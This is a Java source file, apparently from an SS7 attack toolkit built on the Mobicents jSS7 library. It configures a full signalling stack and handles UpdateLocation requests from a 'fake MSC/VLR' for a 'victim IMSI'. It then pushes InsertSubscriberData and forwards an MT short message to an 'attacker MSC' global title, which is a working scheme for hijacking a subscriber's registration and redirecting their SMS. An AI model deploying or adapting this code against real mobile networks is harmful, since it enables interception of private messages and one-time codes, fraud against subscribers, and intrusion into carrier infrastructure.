
/**
 * Created by gh0 on 9/8/16.
 */
/**
 *
 */


import org.apache.log4j.Logger;
import org.mobicents.protocols.api.IpChannelType;
import org.mobicents.protocols.sctp.ManagementImpl;
import org.mobicents.protocols.ss7.indicator.NatureOfAddress;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.m3ua.ExchangeType;
import org.mobicents.protocols.ss7.m3ua.Functionality;
import org.mobicents.protocols.ss7.m3ua.IPSPType;
import org.mobicents.protocols.ss7.m3ua.impl.M3UAManagementImpl;
import org.mobicents.protocols.ss7.m3ua.parameter.RoutingContext;
import org.mobicents.protocols.ss7.m3ua.parameter.TrafficModeType;
import org.mobicents.protocols.ss7.map.MAPStackImpl;
import org.mobicents.protocols.ss7.map.api.*;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPDialogMobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ForwardCheckSSIndicationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ResetRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.*;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeRequest_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeResponse_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeInterrogationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeInterrogationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.*;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortProviderReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortSource;
import org.mobicents.protocols.ss7.map.api.dialog.MAPNoticeProblemDiagnostic;
//import org.mobicents.protocols.ss7.map.api.dialog.MAPProviderError;
import org.mobicents.protocols.ss7.map.api.dialog.MAPRefuseReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPUserAbortChoice;
import org.mobicents.protocols.ss7.map.api.errors.MAPErrorMessage;
import org.mobicents.protocols.ss7.map.api.primitives.AddressNature;
import org.mobicents.protocols.ss7.map.api.primitives.AddressString;
import org.mobicents.protocols.ss7.map.api.primitives.IMSI;
import org.mobicents.protocols.ss7.map.api.primitives.ISDNAddressString;
import org.mobicents.protocols.ss7.map.api.primitives.MAPExtensionContainer;
import org.mobicents.protocols.ss7.map.api.primitives.NumberingPlan;
import org.mobicents.protocols.ss7.map.api.service.sms.*;
import org.mobicents.protocols.ss7.map.api.service.supplementary.SSCode;
import org.mobicents.protocols.ss7.map.api.service.supplementary.SupplementaryCodeValue;
import org.mobicents.protocols.ss7.map.api.smstpdu.*;
import org.mobicents.protocols.ss7.map.datacoding.GSMCharset;
import org.mobicents.protocols.ss7.map.service.sms.SmsSignalInfoImpl;
import org.mobicents.protocols.ss7.map.smstpdu.*;
import org.mobicents.protocols.ss7.sccp.*;
import org.mobicents.protocols.ss7.sccp.impl.SccpStackImpl;
import org.mobicents.protocols.ss7.sccp.parameter.GlobalTitle0100;
import org.mobicents.protocols.ss7.sccp.parameter.SccpAddress;
import org.mobicents.protocols.ss7.tcap.TCAPStackImpl;
import org.mobicents.protocols.ss7.tcap.api.TCAPStack;
import org.mobicents.protocols.ss7.tcap.asn.ApplicationContextName;
import org.mobicents.protocols.ss7.tcap.asn.comp.Problem;

import java.lang.reflect.Array;
import java.nio.charset.Charset;
import java.util.ArrayList;


public class UpdateLocationResp extends UlLowLevel {

    private static Logger logger = Logger.getLogger(UpdateLocationResp.class);

    // SCTP
    private ManagementImpl sctpManagement;

    // M3UA
    private M3UAManagementImpl serverM3UAMgmt;

    // SCCP
    private SccpStackImpl sccpStack;
    private SccpProvider sccpProvider;
    private SccpResource sccpResource;

    // TCAP
    private TCAPStack tcapStack;

    // MAP
    private MAPStackImpl mapStack;
    private MAPProvider mapProvider;


    public UpdateLocationResp() {
        // TODO Auto-generated constructor stub
    }

    protected void initializeStack(IpChannelType ipChannelType) throws Exception {

        this.initSCTP(ipChannelType);

        // Initialize M3UA first
        this.initM3UA();

        // Initialize SCCP
        this.initSCCP();

        // Initialize TCAP
        this.initTCAP();

        // Initialize MAP
        this.initMAP();

        // FInally start ASP
        // Set 5: Finally start ASP
        this.serverM3UAMgmt.startAsp("SASP1");
    }

    private void initSCTP(IpChannelType ipChannelType) throws Exception {
        logger.debug("Initializing SCTP Stack ....");
        this.sctpManagement = new ManagementImpl("Server");
        this.sctpManagement.setSingleThread(true);
        this.sctpManagement.start();
        this.sctpManagement.setConnectDelay(10000);
        this.sctpManagement.removeAllResourses();

        //1. Create SCTP Server
        sctpManagement.addServer(SERVER_NAME, SERVER_IP,SERVER_PORT, ipChannelType,null);
        // 2. Create SCTP Association
        sctpManagement.addServerAssociation(CLIENT_IP, CLIENT_PORT, SERVER_NAME,SERVER_ASSOCIATION_NAME,ipChannelType);
        //3. Start Sever
        sctpManagement.startServer(SERVER_NAME);

        logger.debug("Initialized SCTP Stack ....");
    }

    private void initM3UA() throws Exception {
        logger.debug("Initializing M3UA Stack ....");
        this.serverM3UAMgmt = new M3UAManagementImpl("Server", null);
        this.serverM3UAMgmt.setTransportManagement(this.sctpManagement);
        this.serverM3UAMgmt.start();
        this.serverM3UAMgmt.removeAllResourses();

        // 1. Create App Server
        RoutingContext rc = factory.createRoutingContext(new long[]{100l});
        TrafficModeType trafficModeType = factory.createTrafficModeType(TrafficModeType.Loadshare);


        try {
            this.serverM3UAMgmt.createAs("SAS1", Functionality.IPSP, ExchangeType.SE, IPSPType.SERVER, rc,
                    trafficModeType, 1, null);

            // Step 2 : Create ASP
            this.serverM3UAMgmt.createAspFactory("SASP1", SERVER_ASSOCIATION_NAME);

            // Step3 : Assign ASP to AS
            //AspImpl asp = this.serverM3UAMgmt.assignAspToAs("SAS1", "SASP1");
            this.serverM3UAMgmt.assignAspToAs("SAS1", "SASP1");

            // Step 4: Add Route. Remote point code is 2
            //clientM3UAMgmt.addRoute(SERVER_SPC, -1, -1, "AS1");
            this.serverM3UAMgmt.addRoute(CLIENT_SPC, SERVER_SPC, SERVICE_INDICATOR, "SAS1");
            logger.debug("Initialized M3UA Stack ....");
        } catch(Exception e) {
            e.printStackTrace();

        }

    }


    private void initSCCP() throws Exception {
        logger.debug("Initializing SCCP Stack ....");
        this.sccpStack = new SccpStackImpl("MapLoadServerSccpStack");
        this.sccpStack.setMtp3UserPart(1, this.serverM3UAMgmt);

        this.sccpStack.start();
        this.sccpStack.removeAllResourses();

        this.sccpStack.getSccpResource().addRemoteSpc(1, CLIENT_SPC, 0, 0);
        this.sccpStack.getSccpResource().addRemoteSsn(1, CLIENT_SPC, SSN_Client, 0, false);



        this.sccpStack.getRouter().addMtp3ServiceAccessPoint(1, 1, SERVER_SPC, NETWORK_INDICATOR, 0);
        //addMtp3Destination(sapID, destID, firstDPC, lastDPC, firstSls, lastSls, slaMask)
        this.sccpStack.getRouter().addMtp3Destination(1, 1, CLIENT_SPC, CLIENT_SPC, 0, 255, 255);


        this.sccpProvider = this.sccpStack.getSccpProvider();

        // SCCP routing table
        GlobalTitle0100 calling = this.sccpProvider.getParameterFactory().createGlobalTitle
                ("*", 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                        NatureOfAddress.INTERNATIONAL);
        GlobalTitle0100 called = this.sccpProvider.getParameterFactory().createGlobalTitle
                ("20107891234567", 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_MOBILE, null,
                        NatureOfAddress.INTERNATIONAL);

        GlobalTitle0100 localHlr = this.sccpProvider.getParameterFactory().createGlobalTitle
                ("201012345678", 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                        NatureOfAddress.INTERNATIONAL);
        GlobalTitle0100 localmsc = this.sccpProvider.getParameterFactory().createGlobalTitle
                ("201012344321", 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                        NatureOfAddress.INTERNATIONAL);


        this.sccpStack.getRouter().addRoutingAddress
                (1, this.sccpProvider.getParameterFactory().createSccpAddress
                        (RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, called, SERVER_SPC, SSN_Server));

        this.sccpStack.getRouter().addRoutingAddress
                (2, this.sccpProvider.getParameterFactory().createSccpAddress(
                        RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, calling, 1, SSN_Client));
        this.sccpStack.getRouter().addRoutingAddress
                (3, this.sccpProvider.getParameterFactory().createSccpAddress
                        (RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localHlr, SERVER_SPC, SSN_Server));
        this.sccpStack.getRouter().addRoutingAddress
                (4, this.sccpProvider.getParameterFactory().createSccpAddress
                        (RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localmsc, SERVER_SPC, SSN_MSC));



        SccpAddress patternLocal = this.sccpProvider.getParameterFactory().createSccpAddress(
                RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, calling, 1,SSN_Client );
        SccpAddress patternRemote = this.sccpProvider.getParameterFactory().createSccpAddress
                (RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, called, SERVER_SPC,SSN_Server);
        SccpAddress patternHLR = this.sccpProvider.getParameterFactory().createSccpAddress
                (RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localHlr, SERVER_SPC,SSN_Server);
        SccpAddress patternMSC = this.sccpProvider.getParameterFactory().createSccpAddress
                (RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localmsc, SERVER_SPC,SSN_MSC);


        String maskLocal = "K";
        String maskRemote = "R"; //change mask to match on any digits after (2010) i.e 2010*

        //translate local GT to its POC+SSN (local rule)GTT
        this.sccpStack.getRouter().addRule
                (1, RuleType.SOLITARY, null,OriginationType.LOCAL, patternLocal, maskLocal, 2, -1, null, 0);
        this.sccpStack.getRouter().addRule
                (2, RuleType.SOLITARY, null, OriginationType.REMOTE, patternRemote, maskRemote, 1, -1, null, 0);
        this.sccpStack.getRouter().addRule
                (3, RuleType.SOLITARY, null, OriginationType.REMOTE, patternHLR, maskRemote, 3, -1, null, 0);
        this.sccpStack.getRouter().addRule
                (4, RuleType.SOLITARY, null, OriginationType.REMOTE, patternMSC, maskRemote, 3, -1, null, 0);




        logger.debug("Initialized SCCP Stack ....");
    }

    private void initTCAP() throws Exception {
        logger.debug("Initializing TCAP Stack ....");
        this.tcapStack = new TCAPStackImpl("TestServer", this.sccpStack.getSccpProvider(), SSN_Server);
        this.tcapStack.start();
        this.tcapStack.setDialogIdleTimeout(60000);
        this.tcapStack.setInvokeTimeout(30000);
        this.tcapStack.setMaxDialogs(2000);
        logger.debug("Initialized TCAP Stack ....");
    }

    private void initMAP() throws Exception {
        logger.debug("Initializing MAP Stack ....");

        this.mapStack = new MAPStackImpl("MAP-HLR", this.tcapStack.getProvider());
        this.mapProvider = this.mapStack.getMAPProvider();

        this.mapProvider.addMAPDialogListener(this);
        this.mapProvider.getMAPServiceMobility().addMAPServiceListener(this);
        this.mapProvider.getMAPServiceSms().addMAPServiceListener(this);

        this.mapProvider.getMAPServiceMobility().acivate();
        this.mapProvider.getMAPServiceSms().acivate();


        this.mapStack.start();
        logger.debug("Initialized MAP Stack ....");
    }


    public void onDialogAccept(MAPDialog mapDialog, MAPExtensionContainer extensionContainer) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogAccept for DialogId=%d MAPExtensionContainer=%s",
                    mapDialog.getLocalDialogId(), extensionContainer));
        }
    }


    public void onDialogClose(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("DialogClose for Dialog=%d", mapDialog.getLocalDialogId()));
        }

    }

    public void onDialogDelimiter(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogDelimiter for DialogId=%d", mapDialog.getLocalDialogId()));
        }
    }

    public void onDialogNotice(MAPDialog mapDialog, MAPNoticeProblemDiagnostic noticeProblemDiagnostic) {
        logger.error(String.format("onDialogNotice for DialogId=%d MAPNoticeProblemDiagnostic=%s ",
                mapDialog.getLocalDialogId(), noticeProblemDiagnostic));
    }


    public void onDialogProviderAbort(MAPDialog mapDialog, MAPAbortProviderReason abortProviderReason,
                                      MAPAbortSource abortSource, MAPExtensionContainer extensionContainer) {
        logger.error(String
                .format("onDialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s",
                        mapDialog.getLocalDialogId(), abortProviderReason, abortSource, extensionContainer));
    }


    public void onDialogReject(MAPDialog mapDialog, MAPRefuseReason refuseReason,
                               ApplicationContextName alternativeApplicationContext, MAPExtensionContainer extensionContainer) {
        logger.error(String
                .format("onDialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s",
                        mapDialog.getLocalDialogId(), refuseReason, alternativeApplicationContext,
                        extensionContainer));
    }


    public void onDialogRelease(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogResease for DialogId=%d", mapDialog.getLocalDialogId()));
        }
    }


    public void onDialogRequest(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
                                MAPExtensionContainer extensionContainer) {
        if (logger.isDebugEnabled()) {
            logger.debug(String
                    .format("onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s MAPExtensionContainer=%s",
                            mapDialog.getLocalDialogId(), destReference, origReference, extensionContainer));
        }
    }

    @Override
    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString addressString, AddressString addressString1, AddressString addressString2, AddressString addressString3) {

    }


    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
                                        IMSI arg3, AddressString arg4) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s ",
                    mapDialog.getLocalDialogId(), destReference, origReference));
        }
    }


    public void onDialogTimeout(MAPDialog mapDialog) {
        logger.error(String.format("onDialogTimeout for DialogId=%d", mapDialog.getLocalDialogId()));
    }


    public void onDialogUserAbort(MAPDialog mapDialog, MAPUserAbortChoice userReason,
                                  MAPExtensionContainer extensionContainer) {
        logger.error(String.format("onDialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s",
                mapDialog.getLocalDialogId(), userReason, extensionContainer));
    }


    public void onErrorComponent(MAPDialog mapDialog, Long invokeId, MAPErrorMessage mapErrorMessage) {
        logger.error(String.format("onErrorComponent for Dialog=%d and invokeId=%d MAPErrorMessage=%s",
                mapDialog.getLocalDialogId(), invokeId, mapErrorMessage));
    }

    @Override
    public void onRejectComponent(MAPDialog mapDialog, Long aLong, Problem problem, boolean b) {

    }


    public void onInvokeTimeout(MAPDialog mapDialog, Long invokeId) {
        logger.error(String.format("onInvokeTimeout for Dialog=%d and invokeId=%d", mapDialog.getLocalDialogId(), invokeId));
    }



    public void onMAPMessage(MAPMessage mapMessage) {
        // TODO Auto-generated method stub
        logger.info("onMAPMessage");

    }


    public void onProviderErrorComponent(MAPDialog mapDialog, Long invokeId) {
        logger.error(String.format("onProviderErrorComponent for Dialog=%d and invokeId=%d MAPProviderError=%s",
                mapDialog.getLocalDialogId(), invokeId));
    }


    public void onRejectComponent(MAPDialog mapDialog, Long invokeId, Problem problem) {
        logger.error(String.format("onRejectComponent for Dialog=%d and invokeId=%d Problem=%s",
                mapDialog.getLocalDialogId(), invokeId, problem));
    }


    public static void main(String args[]) {
        System.out.println("*********************************************");
        System.out.println("***          Updating New Location        ***");
        System.out.println("*********************************************");
        IpChannelType ipChannelType = IpChannelType.SCTP;
        //IpChannelType ipChannelType = IpChannelType.TCP;
        if (args.length >= 1 && args[0].toLowerCase().equals("tcp")) {
            ipChannelType = IpChannelType.TCP;
        }

        final UpdateLocationResp victim = new UpdateLocationResp();

        logger.setLevel(org.apache.log4j.Level.DEBUG);

        try {
            victim.initializeStack(ipChannelType);

            // Lets pause for 20 seconds so stacks are initialized properly
            Thread.sleep(20000);
            //victim.initiateSRISMResp();




        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public void onUpdateLocationRequest(UpdateLocationRequest updateLocationRequest) {
        try {
            long invokeIdU = updateLocationRequest.getInvokeId();

            ISDNAddressString MscFake = updateLocationRequest.getMscNumber();
            ISDNAddressString VlrFake = updateLocationRequest.getVlrNumber();

            IMSI TargetImsi = updateLocationRequest.getImsi();
            Category category = this.mapProvider.getMAPParameterFactory().createCategory(5);
            ArrayList<ExtBearerServiceCode> bearerServiceList = new ArrayList<ExtBearerServiceCode>();
            ExtBearerServiceCode extBearerServiceCode = this.mapProvider.getMAPParameterFactory()
                    .createExtBearerServiceCode(BearerServiceCodeValue.padAccessCA_9600bps);
            bearerServiceList.add(extBearerServiceCode);
            boolean roamingResttrictionDueToUnsupportedFeature = false;
            ISDNAddressString sgsnNumber = this.mapProvider.getMAPParameterFactory().
                    createISDNAddressString(AddressNature.international_number,NumberingPlan.ISDN,"201022222222");

            SSCode ssCode = this.mapProvider.getMAPParameterFactory().createSSCode(SupplementaryCodeValue.allForwardingSS);

            //ArrayList<ExtSSInfo> provisionedSS =

            logger.info("New Fake MSC/VLR: "+ MscFake);
            logger.info("Victim IMSI: "+ TargetImsi);

            ISDNAddressString msisdn = this.mapProvider.getMAPParameterFactory().createISDNAddressString(
                    AddressNature.international_number, NumberingPlan.ISDN, "2010789123456");

            GlobalTitle0100 GtHlr = this.sccpProvider.getParameterFactory().createGlobalTitle(
                    "201012345678",0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY,null,
                    NatureOfAddress.INTERNATIONAL);

            GlobalTitle0100 GtMsc = this.sccpProvider.getParameterFactory().
                    createGlobalTitle("96512345678",0,
                            org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY,null,NatureOfAddress.INTERNATIONAL);

            SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory().
                    createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE,GtHlr,SERVER_SPC,SSN_Server);
            SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory()
                    .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE,GtMsc,CLIENT_SPC,SSN_Client);


            MAPDialogMobility dialogMobility = this.mapProvider.getMAPServiceMobility().createNewDialog(
                    MAPApplicationContext.getInstance(MAPApplicationContextName.subscriberDataMngtContext,MAPApplicationContextVersion.version3),
                    callingParty,null,calledParty,null);

            dialogMobility.addInsertSubscriberDataRequest(TargetImsi,msisdn,category,SubscriberStatus.serviceGranted,null,null,null,null,
                    false,null,null,null,null,null,null,null,false,null,null,false,null,15,null,null,
                    null,null,null,null,false,null,null,false,sgsnNumber,null,null,false,false,null);



            dialogMobility.send();

            logger.info("InsertSubscriberDataRequest Message Sent....");

        } catch (MAPException e){
            e.printStackTrace();
        }



    }



    @Override
    public void onUpdateLocationResponse(UpdateLocationResponse updateLocationResponse) {

    }

    @Override
    public void onCancelLocationRequest(CancelLocationRequest cancelLocationRequest) {

    }

    @Override
    public void onCancelLocationResponse(CancelLocationResponse cancelLocationResponse) {

    }

    @Override
    public void onSendIdentificationRequest(SendIdentificationRequest sendIdentificationRequest) {

    }

    @Override
    public void onSendIdentificationResponse(SendIdentificationResponse sendIdentificationResponse) {

    }

    @Override
    public void onUpdateGprsLocationRequest(UpdateGprsLocationRequest updateGprsLocationRequest) {

    }

    @Override
    public void onUpdateGprsLocationResponse(UpdateGprsLocationResponse updateGprsLocationResponse) {

    }

    @Override
    public void onPurgeMSRequest(PurgeMSRequest purgeMSRequest) {

    }

    @Override
    public void onPurgeMSResponse(PurgeMSResponse purgeMSResponse) {

    }

    @Override
    public void onSendAuthenticationInfoRequest(SendAuthenticationInfoRequest sendAuthenticationInfoRequest) {

    }

    @Override
    public void onSendAuthenticationInfoResponse(SendAuthenticationInfoResponse sendAuthenticationInfoResponse) {

    }

    @Override
    public void onAuthenticationFailureReportRequest(AuthenticationFailureReportRequest authenticationFailureReportRequest) {

    }

    @Override
    public void onAuthenticationFailureReportResponse(AuthenticationFailureReportResponse authenticationFailureReportResponse) {

    }

    @Override
    public void onResetRequest(ResetRequest resetRequest) {

    }

    @Override
    public void onForwardCheckSSIndicationRequest(ForwardCheckSSIndicationRequest forwardCheckSSIndicationRequest) {

    }

    @Override
    public void onRestoreDataRequest(RestoreDataRequest restoreDataRequest) {

    }

    @Override
    public void onRestoreDataResponse(RestoreDataResponse restoreDataResponse) {

    }

    @Override
    public void onAnyTimeInterrogationRequest(AnyTimeInterrogationRequest anyTimeInterrogationRequest) {

    }

    @Override
    public void onAnyTimeInterrogationResponse(AnyTimeInterrogationResponse anyTimeInterrogationResponse) {

    }

    @Override
    public void onProvideSubscriberInfoRequest(ProvideSubscriberInfoRequest provideSubscriberInfoRequest) {

    }

    @Override
    public void onProvideSubscriberInfoResponse(ProvideSubscriberInfoResponse provideSubscriberInfoResponse) {

    }

    @Override
    public void onInsertSubscriberDataRequest(InsertSubscriberDataRequest insertSubscriberDataRequest) {

    }

    @Override
    public void onInsertSubscriberDataResponse(InsertSubscriberDataResponse insertSubscriberDataResponse) {
        try{

            /*long invokeId = insertSubscriberDataResponse.getInvokeId();
            ISDNAddressString HlrNumber = this.mapProvider.getMAPParameterFactory().createISDNAddressString(
                    AddressNature.international_number,NumberingPlan.ISDN,"20109876543211");
            MAPDialogMobility mapDialogMobility = insertSubscriberDataResponse.getMAPDialog();

            mapDialogMobility.setUserObject(invokeId);
            mapDialogMobility.addUpdateLocationResponse(invokeId,HlrNumber,null,false,false);
            mapDialogMobility.send();

            logger.info("UpdateLocationResponse Message Sent...Update Location Completed");
            logger.info("Sending SMS...");*/




            //SMS MT
            AddressString orig_smsc = this.mapProvider.getMAPParameterFactory().createAddressString(AddressNature.international_number,
                    NumberingPlan.ISDN,"966123456789");
            IMSI test_imsi = this.mapProvider.getMAPParameterFactory().createIMSI("602027891234567");
            SM_RP_DA sm_rp_da = this.mapProvider.getMAPParameterFactory().createSM_RP_DA(test_imsi);
            SM_RP_OA sm_rp_oa = this.mapProvider.getMAPParameterFactory().createSM_RP_OA_ServiceCentreAddressOA(orig_smsc);

            AddressField oa = new AddressFieldImpl(TypeOfNumber.InternationalNumber,
                    NumberingPlanIdentification.ISDNTelephoneNumberingPlan,"2010789123456");


            AbsoluteTimeStampImpl timeStamp = new AbsoluteTimeStampImpl(16,4,3,15,51,18,2);
            ProtocolIdentifierImpl pi = new ProtocolIdentifierImpl(0);


            DataCodingSchemeImpl dcs = new DataCodingSchemeImpl(0); //default gsm 7 bit
            UserDataImpl ud = new UserDataImpl("Hello World!",dcs,null,null);
            SmsDeliverTpduImpl tpdu = new SmsDeliverTpduImpl(false,false,false,false,oa,pi,timeStamp,ud);
            SmsSignalInfoImpl sm_Rp_UI = new SmsSignalInfoImpl(tpdu, null);

            GlobalTitle0100 GtLocalMSC = this.sccpProvider.getParameterFactory().createGlobalTitle(
                    "201012345678",0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY,null,
                    NatureOfAddress.INTERNATIONAL);

            GlobalTitle0100 GtAttackerMSC = this.sccpProvider.getParameterFactory().
                    createGlobalTitle("96512345678",0,
                            org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY,null,NatureOfAddress.INTERNATIONAL);

            SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory().
                    createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE,GtLocalMSC,SERVER_SPC,SSN_MSC);
            SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory()
                    .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE,GtAttackerMSC,CLIENT_SPC,SSN_MSC);

            MAPDialogSms mapDialogSms = this.mapProvider.getMAPServiceSms().
                    createNewDialog(MAPApplicationContext.getInstance(MAPApplicationContextName.shortMsgMTRelayContext,
                            MAPApplicationContextVersion.version2),callingParty,null,calledParty,null);
            mapDialogSms.addForwardShortMessageRequest(sm_rp_da,sm_rp_oa,sm_Rp_UI,false);


            logger.info("Sending SMS...\n");
            mapDialogSms.send();
            logger.info("SMS Sent...");

        } catch (MAPException e){
            e.printStackTrace();
        }

    }

    @Override
    public void onForwardShortMessageRequest(ForwardShortMessageRequest forwardShortMessageRequest) {
        System.out.println("Receiving SMS..");
        try {
            SM_RP_DA destination_imsi = forwardShortMessageRequest.getSM_RP_DA();
            SM_RP_OA msc = forwardShortMessageRequest.getSM_RP_OA();
            SmsSignalInfo smsMessage =forwardShortMessageRequest.getSM_RP_UI();

            System.out.println(smsMessage);
            System.out.println("SMS forwarded from : " + msc);
        }catch (Exception ex){
            System.out.println("Error receiving SMS.." + ex.getMessage());
        }

    }
    @Override
    public void onDeleteSubscriberDataRequest(DeleteSubscriberDataRequest deleteSubscriberDataRequest) {

    }

    @Override
    public void onDeleteSubscriberDataResponse(DeleteSubscriberDataResponse deleteSubscriberDataResponse) {

    }

    @Override
    public void onCheckImeiRequest(CheckImeiRequest checkImeiRequest) {

    }

    @Override
    public void onCheckImeiResponse(CheckImeiResponse checkImeiResponse) {

    }

    @Override
    public void onActivateTraceModeRequest_Mobility(ActivateTraceModeRequest_Mobility activateTraceModeRequest_mobility) {

    }

    @Override
    public void onActivateTraceModeResponse_Mobility(ActivateTraceModeResponse_Mobility activateTraceModeResponse_mobility) {

    }



    @Override
    public void onForwardShortMessageResponse(ForwardShortMessageResponse forwardShortMessageResponse) {

    }

    @Override
    public void onMoForwardShortMessageRequest(MoForwardShortMessageRequest moForwardShortMessageRequest) {

    }

    @Override
    public void onMoForwardShortMessageResponse(MoForwardShortMessageResponse moForwardShortMessageResponse) {

    }

    @Override
    public void onMtForwardShortMessageRequest(MtForwardShortMessageRequest mtForwardShortMessageRequest) {

    }

    @Override
    public void onMtForwardShortMessageResponse(MtForwardShortMessageResponse mtForwardShortMessageResponse) {

    }

    @Override
    public void onSendRoutingInfoForSMRequest(SendRoutingInfoForSMRequest sendRoutingInfoForSMRequest) {

    }

    @Override
    public void onSendRoutingInfoForSMResponse(SendRoutingInfoForSMResponse sendRoutingInfoForSMResponse) {

    }

    @Override
    public void onReportSMDeliveryStatusRequest(ReportSMDeliveryStatusRequest reportSMDeliveryStatusRequest) {

    }

    @Override
    public void onReportSMDeliveryStatusResponse(ReportSMDeliveryStatusResponse reportSMDeliveryStatusResponse) {

    }

    @Override
    public void onInformServiceCentreRequest(InformServiceCentreRequest informServiceCentreRequest) {

    }

    @Override
    public void onAlertServiceCentreRequest(AlertServiceCentreRequest alertServiceCentreRequest) {

    }

    @Override
    public void onAlertServiceCentreResponse(AlertServiceCentreResponse alertServiceCentreResponse) {

    }

    @Override
    public void onReadyForSMRequest(ReadyForSMRequest readyForSMRequest) {

    }

    @Override
    public void onReadyForSMResponse(ReadyForSMResponse readyForSMResponse) {

    }

    @Override
    public void onNoteSubscriberPresentRequest(NoteSubscriberPresentRequest noteSubscriberPresentRequest) {

    }
}